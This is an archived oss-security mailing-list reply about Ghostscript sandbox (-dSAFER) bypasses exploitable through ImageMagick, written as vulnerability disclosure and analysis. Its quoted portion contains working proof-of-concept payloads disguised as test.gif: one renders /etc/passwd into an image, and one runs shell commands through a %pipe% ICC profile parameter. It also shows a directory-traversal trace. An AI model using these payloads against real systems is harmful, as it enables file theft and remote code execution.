X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3095" "Friday" "30" "September" "2016" "23:11:07" "+0200" "Florian Weimer" "fw@deneb.enyo.de" "<8737kh14b8.fsf@mid.deneb.enyo.de>" "90" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Cc:" nil nil "9" "2016093021:11:07" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        fw@deneb.eny Sep 30   90/3095  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" "<877f9vcjd9.fsf@mid.deneb.enyo.de>" "<CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>" "<CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>" "<CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 22180 invoked by uid 550); 30 Sep 2016 21:11:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 22160 invoked from network); 30 Sep 2016 21:11:19 -0000
References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
	<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>
	<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
	<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
	<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
	<877f9vcjd9.fsf@mid.deneb.enyo.de>
	<CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>
	<CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>
	<CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>
In-Reply-To: <CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>
	(Tavis Ormandy's message of "Fri, 30 Sep 2016 13:05:16 -0700")
Message-ID: <8737kh14b8.fsf@mid.deneb.enyo.de>
MIME-Version: 1.0
Content-Type: text/plain
Cc: oss-security@lists.openwall.com
Date: Fri, 30 Sep 2016 23:11:07 +0200
From: Florian Weimer <fw@deneb.enyo.de>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ImageMagick identify "d:" hangs
To: Tavis Ormandy <taviso@google.com>

* Tavis Ormandy:

> On Thu, Sep 29, 2016 at 2:28 PM, Tavis Ormandy <taviso@google.com> wrote:
>>
>> Just for future reference, here is an example of dumping a file to an
>> image processed with ImageMagick that works with gs 9.20:
>>
>> $ cat test.gif
>> %!PS
>> /Size 20 def                             % font/line size
>> /Line 0 def                              % current line
>> /Buf 1024 string def                     % line buffer
>> /Path 0 newpath def
>>
>> /Courier-Bold findfont Size scalefont setfont
>> 1 1 1 setrgbcolor clippath fill          % draw white background
>> 0 0 0 setrgbcolor                        % set black foreground
>>
>> (/etc/passwd) .libfile {
>>     {
>>         dup Buf readline
>>         {
>>             Path Line moveto show
>>         }{
>>             showpage
>>             quit
>>         } ifelse
>>         % next line
>>         /Line Line Size add def
>>     } loop
>> } if
>> $ convert test.gif png:test.png
>
> The more I look, the worse it gets. This also works in 9.18 and
> higher, arbitrary shell command execution:
>
> $ cat test.gif
> currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty)
> .putdeviceparams
> quit
> $ convert test.gif png:test.png
>
> (Note: I don't know why it doesn't work on earlier versions, maybe
> it's possible to make it work, or some other param will work)

It still tries to open a file in earlier versions, with directory
traversal:

[pid 29607] open("/usr/share/ghostscript/9.06/iccprofiles/../../../../../etc/passwd", O_RDONLY) = 5

The %pipe%-based execution was introduced as a side effect of:

commit 1fae53a708fca6c2ac0417bc23f5d095cc379250
Author: Chris Liddell <chris.liddell@artifex.com>
Date:   Thu Jul 30 17:27:23 2015 +0100

    Bug 696101: fix uses of the sfopen API.
    
    The stream API in GS is defined as *always* opening files in
    binary mode, where applicable, so there is no need for the API
    clients to specify binary mode.
    
    This is previously been benign, and thus ignored, but reportedly
    ending up with a duplicate 'b' character in the mode causes a
    crash on Windows 10.
    
    No cluster differences.


It was not visible before because 'b' in the mode argument to popen
causes glibc's popen to fail.  This is highly non-portable.  Earlier
versions on different libcs are likely have to code execution, too.

> I think -dSAFER is too dangerous to use without sandboxing right now,
> things like evince and imagemagick that use it as a backend should
> disable by default.

Note that this RCE-ish for things like CUPS and with mail clients
which use mailcap entries which map file extensions to some
Imagemagick tool (which ignore the file extension and fingerprint the
input as a Postscript file to be handed off to Ghostscript).

I reported your new vulnerability here:

  http://bugs.ghostscript.com/show_bug.cgi?id=697178

It's been a long time I looked at Ghostscript, but if I recall
correctly, it's implemented in part in Postscript, which probably
explains why there are super-privileged Postscript primitives which
break the sandbox.
